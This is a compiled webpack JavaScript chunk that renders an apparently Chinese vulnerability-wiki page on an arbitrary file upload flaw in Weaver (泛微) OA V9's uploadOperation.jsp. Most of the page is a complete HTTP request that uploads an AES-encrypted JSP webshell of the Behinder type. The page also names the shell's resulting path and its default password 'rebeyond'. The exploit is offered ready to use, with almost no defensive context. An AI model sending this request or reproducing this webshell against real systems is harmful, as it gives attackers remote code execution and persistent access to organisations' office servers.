(window.webpackJsonp=window.webpackJsonp||[]).push([[412],{1453:function(t,s,a){t.exports=a.p+"assets/img/fanwei-14.abe59618.png"},2412:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"泛微oa-uploadoperation-jsp-任意文件上传"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-uploadoperation-jsp-任意文件上传"}},[t._v("#")]),t._v(" 泛微OA uploadOperation.jsp 任意文件上传")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("泛微OA V9 存在文件上传接口导致任意文件上传")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("泛微OA V9")]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("漏洞位于: /page/exportImport/uploadOperation.jsp文件中")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1453),alt:"img"}})]),t._v(" "),n("p",[t._v("请求包")]),t._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[t._v("POST /page/exportImport/uploadOperation.jsp HTTP/1.1\nHost: \nContent-Length: "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("397")]),t._v("\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\nUser-Agent: Mozilla/5.0 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Windows NT "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Win64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" x64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit/537.36 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("KHTML, like Gecko"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68\nOrigin: null\nContent-Type: multipart/form-data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("boundary")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("----WebKitFormBoundary6XgyjB6SeCArD3Hc\nAccept: text/html,application/xhtml+xml,application/xml"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.9")]),t._v(",image/webp,image/apng,*/*"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.8")]),t._v(",application/signed-exchange"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("v")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("b3"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.9")]),t._v("\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.9")]),t._v(",en"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.8")]),t._v(",en-GB"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.7")]),t._v(",en-US"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("q")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.6")]),t._v("\ndnt: "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\nx-forwarded-for: "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),t._v(".0.1\nConnection: close\n\n------WebKitFormBoundary6XgyjB6SeCArD3Hc\nContent-Disposition: form-data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("name")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"file"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("filename")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"test.jsp"')]),t._v("\nContent-Type: application/octet-stream\n\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("%@page "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("import")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"java.util.*,javax.crypto.*,javax.crypto.spec.*"')]),t._v("%"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("%"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("class U extends ClassLoader"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("U"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ClassLoader c"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("super"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("c"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("public Class g"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("byte "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("b"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("return super.defineClass"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("b,0,b.length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("%"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("%if "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("request.getMethod"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".equals"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"POST"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("))")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("String "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("k")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"e45e329feb5d925b"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("session.putValue"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"u"')]),t._v(",k"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("Cipher "),n("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("c")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("Cipher.getInstance"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AES"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("c.init"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(",new SecretKeySpec"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("k.getBytes"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(","),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AES"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("))")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("new U"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("this.getClass"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".getClassLoader"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("))")]),t._v(".g"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("c.doFinal"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("new sun.misc.BASE64Decoder"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".decodeBuffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("request.getReader"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".readLine"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("))")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("))")]),t._v(".newInstance"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".equals"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pageContext"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("%"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n------WebKitFormBoundary6XgyjB6SeCArD3Hc--\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br"),n("span",{staticClass:"line-number"},[t._v("20")]),n("br"),n("span",{staticClass:"line-number"},[t._v("21")]),n("br"),n("span",{staticClass:"line-number"},[t._v("22")]),n("br")])]),n("a-checkbox",{attrs:{checked:""}},[t._v("地址: /page/exportImport/fileTransfer/test.jsp")]),n("br"),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("默认密码 rebeyond")]),n("br")],1)}),[],!1,null,null,null);s.default=e.exports}}]);